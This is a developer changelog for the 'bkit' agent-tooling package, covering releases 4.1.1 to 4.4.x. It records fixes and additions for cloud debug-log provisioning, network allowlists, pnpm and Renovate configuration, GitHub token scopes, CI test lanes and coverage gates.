Makes 4.4.0's cloud debug-fetch provisioning reachable end-to-end. Dogfooding a live Claude-on-web session against a workspace consumer surfaced three blockers between "provision block declared" and "runtime logs fetched": `pnpm add -g` aborting the snapshot, one failing provision recipe killing the whole build, and the egress proxy denying every observability / API host under the default `Trusted` network policy. Adds a generated per-repo `Custom` allowlist, hardens provisioning to best-effort, and stamps a cache-bust so a re-pasted setup script actually rebuilds.

### Added

- **Generated `Custom` network allowlist (`allowed-domains`).** `.agents/config.md` gains a `<!-- allowed-domains:start --> … <!-- allowed-domains:end -->` block where the consumer declares — apex-only, one host per line — the log-backend / API hosts their debug-fetch blocks reach (including the implicit hosts of CLI blocks like `vercel` / `gcloud`) plus the app's own production + preview/dev domains. `bkit install` expands each to `<domain>` + `*.<domain>` (the egress proxy matches apex and subdomains separately) and renders a copy-paste block into `.claude/cloud.md` § Network access with the exact Claude-on-web steps: set **Custom**, tick **Also include default list of common package managers** (this EXTENDS the trusted defaults, never replaces them), paste into **Allowed domains**. Under `Trusted`, those hosts are unreachable, so cloud `/bkit-debug` silently gets no runtime logs and e2e can't hit a deployment; the allowlist closes that. Pure-declare (no URL-scraping) — the consumer owns the list, so bkit names no stack. Falls back to the `Trusted` guidance when no block is declared.
- **Cache-bust line atop the generated setup script.** `.claude/cloud.md`'s setup script now leads with a `# cache-bust YYYY-MM-DD-N` comment, re-stamped on every install / upgrade (new date, or a same-day counter read back from the prior doc). Claude-on-web snapshots the setup script by exact text and reuses it; the changing line forces a fresh snapshot on re-paste, so "latest"-resolved installs (gh, cloud SDKs) re-pull instead of serving a stale snapshot.

### Fixed

- **`pnpm add -g` no longer aborts the cloud snapshot build.** corepack-activated pnpm never runs `pnpm setup`, so its global-bin dir isn't on PATH and `pnpm add -g <cli>` failed with "The configured global bin directory … is not in PATH", killing the `set -euo pipefail` setup script. The provision region (and the per-session `cloud-bootstrap.sh` hook) now export `PNPM_HOME` and prepend it + `$PNPM_HOME/bin` to PATH before any provision recipe runs.
- **A failing provision recipe no longer discards the whole snapshot.** Provision recipes ran inline under the setup script's `set -euo pipefail`, so one failing recipe (e.g. a heavy `curl | bash` installer tripping a missing base-image dep, exit 127) aborted the build and threw away every CLI installed before it. They now run in a best-effort `( set +e … ) || echo <breadcrumb>` subshell — a failing recipe degrades to "that CLI absent", matching the already non-blocking per-session hook.

## [4.4.0] — 2026-07-14

Harden 4.3.0's debug-fetch cloud-provisioning after dogfooding two workspace consumers surfaced the exact silent-no-logs footgun the provision mechanism set out to prevent — a fetch block enabled without its provision sibling — with no advisory to catch it. Adds the missing guardrail, provisions `jq` as a base tool so `curl`-driven blocks work headless, and makes the shipped examples consistently demonstrate the jq projection pattern.

### Added

- **`observability-debug-fetch-provision-missing` preflight advisory.** Flags an enabled `<!-- debug-fetch:start <name> -->` block whose body self-guards on a stack CLI (`command -v <cli>`) but ships no matching `<!-- debug-fetch:provision <name> -->` block below `<!-- bkit:end -->`. That gap is invisible: with the CLI absent the block self-skips (`exit 0`) in cloud, so `/bkit-debug` fetches no runtime logs and it reads as "clean" rather than "not wired up". Keyed on the block's own `command -v` guard, so curl/jq/API blocks never false-positive; base tools (`curl`, `jq`, `date`, …) are allowlisted; NAMED blocks only; dismissable via `<!-- debug-fetch:none -->`. Runs on `bkit check` / `install` / `doctor`.
- **`jq` provisioned as a cloud base tool.** The generated `.claude/cloud.md` setup script now installs `jq` (self-guarded jqlang static binary, same snapshot-once pattern as vale/gh) alongside vale/gh/corepack. debug-fetch blocks that post-process `curl` output with `| jq …` need it and the Claude-web base image may not ship it — bkit's reference blocks avoided jq for that reason, but consumer blocks routinely use it. Cursor already installs jq via its Dockerfile; gh-runners ship it.

### Changed

- **Reference debug-fetch examples now consistently use `jq`.** The `vercel` (`--json` piped to `jq`) and `supabase` (`curl` piped to `jq`) examples in `.agents/config.md` both project to a PII-safe field subset, rather than one emitting `--json` and the other dumping raw `curl`. Field shapes were verified against the live Vercel + Supabase APIs. `.agents/config.md` gains a "Formatting output (`jq`)" note: why jq (filter + PII-safe projection, never raw rows), that a block may assume jq is present (base tool, no self-gate), and the without-`jq` fallback (`node -e` / `python3 -c`, or raw emit with the PII caveat).

### Fixed

- **Removed the stale `debug-fetch:provision supabase` example.** It installed the `supabase` CLI that the curl/Management-API `supabase` fetch block never calls — contradicting the doc's own "an MCP or curl/API block needs no CLI" rule. The provision doctrine is sharpened accordingly: only a block that shells out to a stack CLI ships a provision block (the `vercel` example does; the curl-based `supabase` example does not).

---

## [4.3.1] — 2026-07-13

Two consumer-facing fixes surfaced by real workspace consumers on 4.3.0: the self-bump upgrade path aborted on pnpm workspaces, and the `main-lag-warning` drift advisory pointed cache-less consumers at a CI-breaking edit.

### Fixed

- **`bkit upgrade --latest` / `--to=<v>` aborted on pnpm-workspace consumers with `ERR_PNPM_ADDING_TO_ROOT`.** The atomic self-bump shelled out to `pnpm add -D @cbartens/bkit@<v>` with no `-w`, so in a workspace **root** — where bkit is conventionally a root devDependency — pnpm refused and the bump never happened (nothing re-rendered). The documented "supported way to move bkit versions" was broken for every workspace consumer; bkit's own repo is single-package, so self-dogfood never hit it. Now detects the workspace root (`pnpm-workspace.yaml` at cwd) and passes `-w`; a single-package repo is unaffected (a bare `-w` there would itself error).
- **The `main-lag-warning` drift advisory told cache-less consumers to inject an undefined step reference that reds actionlint.** The bkit-owned, byte-compared `main-lag-warning` block hard-coded `steps.cache.outputs.skip != 'true'` on the `Check Main Lags Dev` step — a reference to a `Check SHA Cache` step (`id: cache`) that lives OUTSIDE the managed block and is not present in every consumer. A consumer whose `ci.yml` has no cache step correctly adapted the block without that guard, so `bkit check` raised `tier2-text-drift`, and re-syncing per the advisory injected a reference to a nonexistent step id → the Run Actionlint gate rejected it. The block is now self-contained (guard dropped), so it is valid standalone in any job shape and the drift clears for cache-less consumers with no CI-breaking edit.

---

## [4.3.0] — 2026-07-13

Move the debug-fetch runtime-log contract out of `docs/observability.md` (logging doctrine) into a new tooling-parsed config doc `.agents/config.md`, and add stack-agnostic cloud CLI auto-provisioning so a headless `/bkit-debug` produces runtime logs without bkit ever naming a stack. Existing consumers' debug-fetch blocks migrate automatically on `bkit install` / `bkit upgrade` — nothing to do.

### Added

- **`.agents/config.md` — the debug-fetch runtime-log contract as tooling-parsed config.** The `debug-fetch:*` blocks `/bkit-debug` runs (plus the provisioning below) moved out of `docs/observability.md` into a dedicated Tier-2 managed doc that bkit tooling parses, keeping `observability.md` pure logging _doctrine_. Seeded on install, drift-gated, indexed in `.agents/docs.md`; `observability.md` keeps a one-line pointer. `/bkit-debug` and the two `observability-debug-fetch-*` preflight advisories read the new location.
- **`debug-fetch:provision` — stack-agnostic cloud CLI provisioning.** A cloud `/bkit-debug` only produces runtime logs when the block's CLI (`vercel` / `supabase` / …) is present, but bkit cannot hardcode a stack CLI without breaking stack-independence. Consumers now declare each block's install recipe in a self-guarded `<!-- debug-fetch:provision <name> -->` sibling; bkit runs it in both cloud paths — `.claude/hooks/cloud-bootstrap.sh` on session start (gh-runner + resumed web) and injected into the generated `.claude/cloud.md` setup script via `@@CLOUD_DEBUG_FETCH_PROVISION@@` (web snapshot). bkit ships only the parser; the CLI name and recipe stay consumer-side. An MCP-based fetch block needs no provision block.

### Changed

- **Debug-fetch config auto-migrates `docs/observability.md` → `.agents/config.md` on install AND upgrade.** Consumer `debug-fetch:*` blocks copied into `observability.md`'s consumer section relocate to `.agents/config.md` automatically — content-preserving, idempotent, dedup-safe — so an upgrading consumer does nothing. Wired into both the install path (`runCoreModule`) and the separate `bkit upgrade` engine, so the canonical Renovate `bump → bkit upgrade --auto-apply` flow migrates too. (#334)

---

## [4.2.2] — 2026-07-05

Modernize the shipped `renovate.json5` to Renovate 41+ config keys and document the `Commit statuses` token permission — both surfaced by bkit's own self-hosted Renovate opening its first live PRs.

### Fixed

- **Deprecated Renovate config keys drove the Dependency Dashboard's "Config Migration Needed" prompt.** The shipped `renovate.json5` used `matchPackagePatterns` (five package-group rules) and `baseBranches`, both deprecated in Renovate 41+, so every consumer's Dependency Dashboard raised a "Config Migration Needed" checkbox. Migrated to `matchPackageNames` (glob form — `@types/**`, `@tanstack/**`, `vitest*`, etc.) and `baseBranchPatterns` — equivalent matching, verified with `renovate-config-validator` (migration now clean). Do NOT accept the migration via the dashboard checkbox: `renovate.json5` is Tier-1 canonical-overwrite, so a migration PR is clobbered on the next `bkit install`/`upgrade` — the fix ships in the template instead.
- **Self-hosted Renovate needs `Commit statuses: Read and write` — without it PRs never open.** bkit's documented `GH_BKIT_TOKEN` scopes missed `Commit statuses`. A live run surfaced the exact failure mode: Renovate creates the `renovate/*` branch, then `403`s on `GET /commits/{sha}/statuses` and never opens the PR (symptom: a lone `renovate/*` branch, no PR, no CI run). Now documented across `.env.example`, `deployments.md` § Self-hosted Renovate (scopes table + prose), the install activation advisory, and KN-CORE-10 — including that fine-grained PATs have **no** `Checks` permission (check-run writes are GitHub-App-only), so commit statuses is the mechanism a PAT-based Renovate uses. Verified live: with the scope added, the `renovate/github-actions` PR opened and CI ran on it.

---

## [4.2.1] — 2026-07-05

Document the exact GitHub token permissions and repository Advanced Security settings self-hosted Renovate needs (surfaced by bkit's own dry-run smoke), and wire `RENOVATE_GIT_AUTHOR` into the shipped workflow so org-owned tokens get correct commit authorship.

### Changed

- **Self-hosted Renovate — precise token scopes, repo Advanced Security settings, and `RENOVATE_GIT_AUTHOR`.** A live dry-run of bkit's own self-hosted Renovate surfaced two gaps the shipped guidance missed. Now documented across `.env.example`, `deployments.md` § Self-hosted Renovate, KN-CORE-10, and the install activation advisory, using the exact labels the GitHub UI shows: (1) the `GH_BKIT_TOKEN` fine-grained PAT needs **Dependabot alerts: Read** (else a non-fatal `403` on the alert feed — `osvVulnerabilityAlerts`/OSV still covers CVEs); (2) the repo must have **Dependency graph** + **Dependabot alerts** enabled but **Dependabot security updates** + **Dependabot version updates** disabled ("detection ON, auto-fixing OFF" — else Dependabot opens PRs competing with Renovate); (3) commit authorship — the `Email addresses: Read` **Account** permission exists only on personal-account tokens, so the shipped `renovate.yml` now reads `RENOVATE_GIT_AUTHOR` from a repo variable (`${{ vars.RENOVATE_GIT_AUTHOR }}`), the portable fix for org-owned tokens that can't grant it.

---

## [4.2.0] — 2026-07-05

Add a self-hosted Renovate runner (`bkit install --renovate=self`) for large monorepos that OOM on Mend's 3 GB hosted runner, and split the GitHub token scheme into a read-only install token and a general write token (the latter now also powers self-hosted Renovate). **Breaking:** the token rename requires a one-time secret rename on upgrade — a `gh-token-scheme-rename` advisory guides it (#325).

### Added

- **Self-hosted Renovate runner — `bkit install --renovate=self`.** Ships a bkit-managed, SHA-pinned `.github/workflows/renovate.yml` running `renovatebot/github-action` on `ubuntu-latest` (~16 GB) as an alternative to the Mend-hosted Renovate App, for large pnpm-11 monorepos that hit Mend's 3 GB microvm ceiling (`kernel-out-of-memory`; #308, KN-41). One flag selects the module + runner (auto-selects renovate, like `--typescript` auto-adds `--ci`); `--renovate=mend` (default) uses the hosted App and reclaims a stale workflow. The config `renovate.json5` is single-source (byte-identical for both runners); the mode is the presence of the workflow file, recorded in `package.json` `bkit.renovateRunner`. Platform auth uses `GH_BKIT_TOKEN` (never `GITHUB_TOKEN`, whose PRs don't trigger CI); registry auth stays on the classic `GH_BKIT_TOKEN_INSTALL` via `RENOVATE_HOST_RULES`. A self-managed GitHub App is documented as the no-expiry hardening path. New advisories: `renovate-self-hosted-mend-both-active` (warns to suspend the Mend App); the pnpm-11 OOM advisory is suppressed on self-hosted. Docs: `deployments.md` § Self-hosted Renovate, KN-CORE-10, DE-34.

### Changed

- **BREAKING — GitHub token scheme split.** Two clearly-separated tokens replace the old pair: `GH_BKIT_TOKEN_INSTALL` (classic `read:packages`, for GitHub Packages install/lockfile auth — the former `GH_BKIT_TOKEN`) and `GH_BKIT_TOKEN` (the general fine-grained WRITE token — the former `GH_MCP_TOKEN` — powering the GitHub MCP server AND self-hosted Renovate's platform auth). Splitting write from `read:packages` keeps least privilege on the widely-distributed install token, and is forced by GitHub Packages rejecting fine-grained PATs (403). **On upgrade you must rename the secret** everywhere it lives (local `.bkit/.env`, CI Actions secret, Vercel env, Mend dashboard) — the `gh-token-scheme-rename` advisory fires with step-by-step guidance; the token VALUES do not change. All shipped detectors, docs, `.env.example`, and the presence matrix updated. Docs: DE-35.

---

## [4.1.12] — 2026-07-04

Share the unit branch-coverage gate between CI and the `/bkit-build` pre-PR check via a single `test:coverage:unit` script, and add a memory-hygiene guideline to the shipped `CLAUDE.md`.

### Added

- **Memory-hygiene guideline in the shipped `CLAUDE.md`.** The template `CLAUDE.md` now tells Claude Code auto-memories (`MEMORY.md` + `memory/*.md`) to point at `docs/*.md` rather than duplicate them — save a pointer (path + section + one-line hook), never copy the fact, so the two cannot drift.

### Changed

- **Unit branch-coverage gate shared via a single `test:coverage:unit` script.** The unit-coverage command — scoped with `--coverage.include` to the logic surface and floored by `--coverage.thresholds.branches` — now lives in one `package.json` script that both the CI unit lane and the `/bkit-build` pre-PR gate (`bkit-build.md` Step 13) invoke. A coverage regression now fails in the worktree during build instead of only later on the PR, and the threshold is bumped in one place for both callers. The build workflow references the script by name (stack-agnostic): define the script and the gate engages, omit it and it no-ops. Shipped across `.bkit/templates/docs/testing.md`, `.bkit/workflows.md`, `.bkit/workflows/bkit-build.md`, and bkit's own CI + `package.json`.

---

## [4.1.11] — 2026-07-03

Group `bkit design` workstreams under the parent's native milestone instead of sub-issues, and repair markdown-table corruption from a prettier-ignore table-splitter bug.

### Changed

- **`bkit design` assigns workstreams to a milestone, not sub-issues.** Step 9 now assigns each workstream issue to the MILESTONE-labelled parent's native milestone (GitHub) / project + project milestone (Linear) instead of attaching them as sub-issues. The parent must already carry the target — MCP cannot create milestones/projects, so an unset target is a Failure Path — and existing-workstream detection uses `search_issues` (GitHub) / `list_issues` project filter (Linear). Shipped across `.bkit/workflows/bkit-design.md` and the `.claude` / `.cursor` / `.opencode` command mirrors.

### Fixed

- **prettier-ignore table splitter corrupted escaped pipes.** The markdown table normaliser split rows on every `|`, turning an escaped literal pipe (`a\|b`) into a phantom column separator and corrupting cells across shipped docs (`.bkit/prompts.md`, `.bkit/providers.md`, `README.md`, `docs/deployments.md`) and plan logs. The splitter now splits on unescaped pipes only, and the previously-corrupted cells are repaired style-preservingly (adjacent bash-OR `\|\|`, spaced `\| `, and glued `\|` each restored to their original form).

---

## [4.1.10] — 2026-07-03

Ship the coverage-on-PR scaffold (free per-tier vitest + Playwright E2E coverage comments), split bkit's own CI into one lane per tier to dogfood the consumer shape, pin third-party supply-chain refs to immutable digests, and document turbo's `//` docs-only over-trigger (#312, #313, #314).

### Added

- **Coverage-on-PR scaffold (`bkit-stub:coverage`).** Free, per-tier vitest coverage comments on PRs via `davelosert/vitest-coverage-report-action` — runs entirely inside Actions with `GITHUB_TOKEN` (no third-party service, private-repo safe). Report-only by default; unit and integration are measured and commented **separately** (a single merged number lets integration mask a hollow unit suite — coverage is a union). Thresholds are opt-in and per-tier: unit is the branch-coverage gate (a `--coverage.thresholds.branches` CLI flag on the unit run only — vitest coverage is per-run, not per-`projects`), integration stays report-only and gates on execution (`integration_ran > 0`). (#312)
- **Playwright E2E coverage-on-PR stub (`bkit-stub:e2e-coverage`).** The same report-only per-tier coverage comment for the E2E lane. Playwright is black-box (no `--coverage` flag), so the stub documents a collect → Monocart report → `davelosert` comment pipeline that emits the same Istanbul-format files the unit/integration reports use. Report-only, gated on the E2E step running rather than a percentage. (#313)
- **Separate integration + E2E lane stubs (`bkit-stub:bkit-tests-integration` / `bkit-stub:bkit-tests-e2e`).** The scaffold reference now defines each test tier as its own parallel lane (job) — matching bkit's own CI and consumers gether/fraser — with the same stub + advisory treatment as the migrate / live / check tiers. (#312)

### Changed

- **bkit's own CI split into separate unit + integration lanes.** The monolithic `bkit-tests` job becomes parallel `bkit-tests-static` + `bkit-tests-unit` + `bkit-tests-integration` lanes to dogfood the one-lane-per-tier shape consumers run; the shipped docs + advisories align with the separate-lane doctrine, and bkit's own unit branch coverage is gated at 65% (integration stays report-only). (#312)
- **Third-party supply-chain refs pinned to immutable digests.** Third-party GitHub Actions and downloaded scripts in the shipped CI reference and bkit's own workflows are pinned to immutable commit digests rather than mutable tags. (#314)
- **turbo `//` over-triggers `web_affected` on docs-only diffs (documented).** The `bkit-stub:affected-graph` reference and `docs/deployments.md` now warn that turbo attributes non-workspace root paths (`docs/**`, `README`, …) to the root `//` package as `FileChanged`, so a bare `global_dep → web_affected=true` force reds the E2E lane on docs-only pushes (the host cancels the docs-only preview, then `Await Deployment` fails). The fix — gate the force on a real global-dep change by intersecting changed root files against `turbo.json` `globalDependencies`/`globalEnv` — is consumer-owned reference guidance.

### Fixed

- **Per-tier coverage scoping corrected.** Each tier's coverage is scoped via `--coverage.include` CLI flags, not vitest `projects` (which does not scope per-run coverage), and a `bkit-install.ts` unit-coverage gap is closed. (#312)

---

## [4.1.9] — 2026-07-02

Correct the `pnpm-release-age-gate-oom` advisory shipped in 4.1.8 — the fix is `minimumReleaseAge: 0`, not deleting the key — and make the detector value-aware (#308).

### Fixed

- **`pnpm-release-age-gate-oom` advisory recommended the wrong remediation.** 4.1.8 advised DELETING the pnpm-level `minimumReleaseAge` from `pnpm-workspace.yaml` to clear the Mend Renovate microvm OOM. That is wrong on pnpm 11: pnpm 11 defaults `minimumReleaseAge` to `1440` (pnpm 10 defaulted it off), so removing the key leaves the OOM-causing per-entry publish-timestamp verification live — and also strips any `minimumReleaseAgeExclude`, so same-day `@cbartens/*` installs then fail the gate. Only `minimumReleaseAge: 0` short-circuits the verification (proven: a `--frozen-lockfile` install drops from an OOM to ~3.7s). The advisory now recommends `minimumReleaseAge: 0` and its detector is value-aware — it fires on pnpm 11 + Renovate whenever the gate is active (key absent → the 1440 default, or any positive value) and clears only on an explicit `minimumReleaseAge: 0`, fixing both the false-fire on `: 0` and the false-negative on the absent-key default; it also now requires `pnpm-workspace.yaml` as a monorepo signal. The shipped `renovate.json5` comment, `docs/deployments.md` (template + own), and KN-41 (with a dated correction) are updated to match. (#308)

---

## [4.1.8] — 2026-07-02

Prevent Mend Renovate microvm OOM on pnpm-11 monorepos, pin the medium agent tier to Claude Sonnet 5, permit tracker CLI/HTTP shell-outs as an MCP backup, and scope `.bkit/.env` to bkit/agent tooling secrets only (#308, #205, #310).

### Added

- **`pnpm-release-age-gate-oom` postinstall advisory + Renovate worker caps.** Large pnpm-11 monorepos running the per-install pnpm `minimumReleaseAge` supply-chain gate OOM Mend's low-RAM hosted Renovate runner during `pnpm update --lockfile-only` (physical kernel-out-of-memory), blocking every dependency PR; CI/Vercel have more RAM and are unaffected. The canonical `renovate.json5` now caps pnpm's worker pool via `env: { PNPM_WORKERS, PNPM_MAX_WORKERS }` (allow-listed by Mend's `global:safeEnv`, so no admin `allowedEnv` change) and enforces freshness in Renovate itself via `minimumReleaseAge: "1 day"` (security / `osvVulnerabilityAlerts` PRs bypass by design, so CVE fixes are not delayed). The new advisory fires only on pnpm 11 + Renovate active + the pnpm-level gate present, and self-clears once the consumer drops that gate from `pnpm-workspace.yaml` (a shorter threshold does not help). Shipped `docs/deployments.md` gains the Renovate pnpm-11 guidance and KN-41 records it. (#308)

### Changed

- **Medium-tier agent model pinned to Claude Sonnet 5.** `claude-sonnet-4-6` → `claude-sonnet-5` (GA 2026-06-30, id `claude-sonnet-5`, verified live) on the Claude pin only — across `prompts.md` (effort→model table, Models Claude column, `/build` + `/ship` orchestrators, live model-ID verification note), the 17 `.bkit/prompts/*.md` frontmatter pins, the `.claude` `bkit-*` mirrors, and the hand-authored `utility-new-release` + `utility-harvest-friction` agents. `utility-pre-release-check` stays on `claude-opus-4-8`; the Cursor and non-Anthropic opencode provider columns are unchanged. (#205)
- **Tracker MCP rule softened to MCP-first with a CLI/HTTP fallback.** `rules.md` (and the shipped template) no longer absolutely prohibit tracker CLI/HTTP shell-outs — they are permitted as a backup when the configured tracker MCP is unavailable (e.g. an empty `GH_MCP_TOKEN` under a Dock/launchd-launched Cursor). (#310)

### Removed

- **Stack-named debug-fetch creds dropped from `.bkit/.env`.** `VERCEL_TOKEN` / `SUPABASE_ACCESS_TOKEN` are removed from `.bkit/.env` and both `.env.example` files (template + own): they name a stack (breaking stack-independence) and already live in consumers' app env files (`apps/web/.env.{local,preview,…}`), which `.envrc` sources after `.bkit/.env` — so the seeds were shadowed and drifted on rotation. `docs/observability.md` now documents local token placement (app env file, as a stack-varying example); the `.bkit/.env.example` merge advisory and `cloud.md` debug-fetch blocks are updated to match. The `cloud-dashboard` postinstall advisory is intentionally kept.

---

## [4.1.7] — 2026-06-29

Collapse `.agents/docs.md` to a two-table model, move the consumer-owned guarantee inside each managed block, and scope the shipped surface to be stack-agnostic — trim stack-specific doc templates and permission gates, narrow the WebFetch allowlist to the bkit ecosystem (#304, #305).

### Changed

- **`.agents/docs.md` collapsed to a two-table model.** The Workflow-Matrix and Full-Catalog tables merge into one Universal Documents matrix (17 rows, custom order); the Project Documents section below `bkit:end` is now an empty header-only consumer template with no seeded rows. (#305)
- **Consumer-owned guarantee note moved inside each managed block.** The note that the region below `bkit:end` is consumer-owned now lives inside the `bkit:start/end` block of `docs.md`, `skills.md`, and `rules.md`, so `bkit install` can never edit it out; the Project heading and structure stay below `bkit:end`. (#304)
- **WebFetch allowlist scoped to the bkit ecosystem.** The shipped `.claude/settings.json` WebFetch allow-list is now bkit-ecosystem org wildcards (github / anthropic / claude / cursor / linear / opencode / ollama / nvidia / npm), each carrying apex + `*.org` as needed — Claude Code's domain matcher does not treat an apex as covering its subdomains. `supabase.com` and `developer.mozilla.org` are dropped.

### Removed

- **Stack-specific doc templates.** `data-pipeline.md`, `data-cron-jobs.md`, `notifications.md`, and `webhooks.md` are no longer seeded (template + copies removed; deletions now stick). The stack-agnostic `data-schema.md`, `styles.md`, and `warnings.md` remain universal/seeded. (#305)
- **Stack-specific permission gates.** The Vercel (`vercel rm` / `remove`) and Supabase (`db reset`, `projects delete`) entries are removed from the `.claude/settings.json` ask-list and the `.opencode/opencode.json` bash map (template + live); the opencode↔claude gate-parity assertion is updated to match. Consumers add stack gates locally per stack-independence.

### Fixed

- **`bkit uninstall` no longer leaks comment-prefixed marker files.** Uninstall's `detectMarkerStyle` recognised only a bare `<!-- bkit:start -->` line, so a managed-text file whose markers carry a `# ` / `// ` comment prefix (e.g. the shell hook `preflight.sh`, which uses `# <!-- bkit:start -->`) was misread as 100% consumer content and preserved in full on uninstall — leaving the entire bkit hook body behind. It now matches the same comment prefixes `findAnchored` accepts, so the bkit block is stripped (and the file removed when only the block remains).

---

## [4.1.6] — 2026-06-27

Re-fix `.npmrc` GH Packages auth for pnpm 11, consolidate CI force markers to `[force build]` + `[force full]`, add a pre-push CI-suppressor HEAD guard, and ship agent-doctrine + slop gate-suppression rules (#274, #291).

### Added

- **`vercel-installcommand-missing-auth` post-install advisory.** Closes the gap that triggered the 4.1.2 revert: bkit checked the Vercel `GH_BKIT_TOKEN` env var but never whether `vercel.json` actually authenticates in its `installCommand`. A Vercel project whose install step omits the `pnpm config set` auth now surfaces at install time instead of as an un-attributable build 401. Unblocks the pnpm-11 migration (#176).
- **Pre-push CI-suppressor HEAD guard.** `.husky/pre-push` (and its template) now blocks a push whose HEAD commit carries a `[skip ci]`-class token while an open PR exists for the branch — so a manual rebase, force-push, or post-close commit can no longer leave a PR's checks vacuously green. `dev`/`main` are exempt; a push with no open PR (mid-loop status, abort handover) is allowed; a missing `gh` degrades to a warning. Backstops the #261 CI-Dispatch gate, which only covers the workflow's own close push.
- **`boundary/gate-suppression` slop rule.** Flags skipped/focused tests (`.skip`/`.only`/`x*`/`f*`) and BLANKET lint disables (whole-file or no-rule); targeted per-rule disables stay sanctioned per doctrine. Required-rule count raised 11 → 12.
- **Agent-doctrine principles in `rules.md`.** Added Improve-over-duplicate, Scope discipline, No speculative scope, Truth over agreement, Honest reporting, No invented symbols, Comments & dead code, and Fix-code-never-gate to the shipped rules (and template mirror).
- **GateGuard callee-existence check.** The Claude (`.cjs`) and opencode (`.js`) gateguard hooks now prompt to confirm the symbols, flags, and configs a change calls actually exist — complementing the existing caller/blast-radius check.

### Changed

- **CI force markers consolidated to `[force build]` + `[force full]`.** The shipped `ci.yml` and `deployments.md` force-tag table collapse the old per-lane tokens to two: `[force build]` and `[force full]` (the latter replaces `[force e2e]`, gating `should_run_full`). Documented precedence (skip > force), `[force cache]` orthogonality, and the marker-parity advisory. `should_run_e2e` is retained as a legacy token so pre-#291 consumers are not false-advised.
- **`[skip build]` removed from workflow-commit doctrine.** bkit workflows now stamp only `bkit [skip ci]` on docs-only commits (was `bkit [skip build] bkit [skip ci]`); the standalone pre-worktree `[skip build]` is dropped. CI behaviour is unchanged — Vercel-cancel now relies on affected-detection. The PR-title HEAD-Subject Assertion keeps its defensive `[skip build]` check. `rules.md` tightened: `[skip ci]`/`[skip build]` are for workflow bookkeeping / docs-only commits only — never on a manual code commit or as a PR-branch HEAD.

### Fixed

- **GH Packages auth no longer relies on project-`.npmrc` env-substitution — reverses the 4.1.2 regression.** 4.1.2 re-added a `//npm.pkg.github.com/:_authToken=${GH_BKIT_TOKEN}` line to the advised `.npmrc` on the premise "pnpm interpolates it at runtime" — false on pnpm >=10.34.2, which 401s on download (`ERR_PNPM_FETCH_401`). It only looked correct because everything was pinned to pnpm 10.34.1, where env-substitution still warns-but-works from store cache. Advisories, doc comments, KN-CORE-7, and `.bkit/.env.example` now prescribe #274's doctrine again: the project `.npmrc` carries only the `@cbartens` registry mapping; the token is written to pnpm's user-level config via `pnpm config set` (the shell-expanded literal token — version-proof across pnpm 10.x/11.x) on every install surface (CI step, local-once, Vercel `installCommand`). `detectNpmrcLegacyAuthToken` and the `npmrc-legacy-authtoken` advisory are restored.

---

## [4.1.5] — 2026-06-18

Add `bkit upgrade --to/--latest`, branch-scope stale-render gates, and surface slop:delta remediation doctrine in gate output (#295, #296).

### Added

- **`bkit upgrade --to=<version>` / `--latest`.** Atomically bumps `@cbartens/bkit` and re-renders + re-pins mirrors in one command (re-execs the freshly-installed binary), so a package bump can never drift from its rendered output.
- **Branch-scoped stale-render gates.** `detectRenderedPromptsStale` and `detectManagedDocsStale` now hard-block on `main`/`dev` (and PRs targeting them via `GITHUB_BASE_REF`) but emit a non-blocking advisory on feature branches, which inherit a stale render rather than create it.
- **slop:delta remediation doctrine in gate output.** On `slop:delta` FAIL, the gate now prints a single atomic advisory: fix net-new slop only (baseline is never yours); use `Record<string, unknown>` instead of type-suppression; fix structure/defensive issues in place — never delete, move, merge files, or rewire callers to clear the gate.

### Changed

- **Gateguard hook clarity.** Updated investigation checklist wording for precision.
- **Editing guidelines.** Clarity improvements in version-hash commentary.

---

## [4.1.4] — 2026-06-17

Complete the `GH_MCP_TOKEN` rename by dropping legacy `GH_TOKEN` migration paths, and document the agent-shell direnv gap (#478).

### Changed

- **`GH_MCP_TOKEN` only.** Removed `detectLegacyGhTokenInDotenv`, `mcp-env-legacy-gh-token` advisory, and `detectShellGhToken` alias — bkit no longer checks or migrates `GH_TOKEN` in `.env`.

### Added

- **KN-CORE-9.** Documents that Cursor agent Shell does not auto-run direnv; agents should prefix one-off CLI with `direnv exec . bash -c '…'` when repo env vars appear unset. Universal rule added to `.agents/rules.md`.

---

## [4.1.3] — 2026-06-17

Rename local GitHub MCP PAT from `GH_TOKEN` to `GH_MCP_TOKEN` so direnv no longer overrides `gh auth login` keyring auth (#287).

### Changed

- **`.bkit/.env.example` → `GH_MCP_TOKEN`.** MCP-only fine-grained PAT for the GitHub MCP server.
- **MCP configs** (`.mcp.json`, `.cursor/mcp.json`, OpenCode template) reference `${GH_MCP_TOKEN}` / `{env:GH_MCP_TOKEN}`.
- **Preflight/postinstall advisories** renamed to `gh-mcp-token-unset-shell` / `gh-mcp-token-empty-shell`.
- **Docs:** `KN-CORE-8`, updated setup/cloud/README copy.

### Unchanged

- CI workflow steps keep `GH_TOKEN: ${{ github.token }}` (GHA convention for `gh` in Actions).

---

## [4.1.2] — 2026-06-17

Fix breaking `.npmrc` auth regression — restore the `//npm.pkg.github.com/:_authToken=${GH_BKIT_TOKEN}` line that #274 incorrectly removed.

### Fixed

- **`.npmrc` auth token line restored.** The `_authToken=${GH_BKIT_TOKEN}` reference is required — pnpm interpolates it from the environment at runtime. Without it, Vercel builds (and any environment without a `pnpm config set` pre-step) fail with `ERR_PNPM_FETCH_401`. The `pnpm config set` in CI is now documented as belt-and-braces rather than the sole auth mechanism.
- **`detectNpmrcLegacyAuthToken` removed.** This function incorrectly flagged the auth token line as "legacy" and advised its removal. Advisories now prescribe both `.npmrc` lines (registry mapping + auth token).
- **Vercel advisory simplified.** Vercel reads `.npmrc` directly with `${GH_BKIT_TOKEN}` from the project env var — no `installCommand` workaround needed.

---

## [4.1.1] — 2026-06-17

Split bkit's own CI and the consumer CI template into parallel test lanes, dogfooding the pattern recommended in the scaffold reference.

### Changed

- **Parallel CI test lanes.** Both bkit's own `.github/workflows/ci.yml` and the consumer template (`.bkit/templates/.github/workflows/ci.yml`) now ship `bkit-tests-static` + `bkit-tests-unit` as parallel sibling jobs instead of a single serial `bkit-tests`. Wall-clock = MAX(lane) instead of SUM(steps). The `bkit-tests-check` capstone asserts both lanes passed and unit executed >0 tests.
- **Consumer template ships pre-split.** New consumers get the two-lane pattern by default. The `verbose-ci-env` managed block stays in `bkit-tests-static` (single instance for drift detection); `bkit-tests-unit` duplicates the env vars with a cross-reference comment. Stubs (`auto-force-e2e`, `e2e`, `vercel-await`, etc.) live in the unit lane; `migrations-immutable` stays in static.

---

## [4.1.0] — 2026-06-17

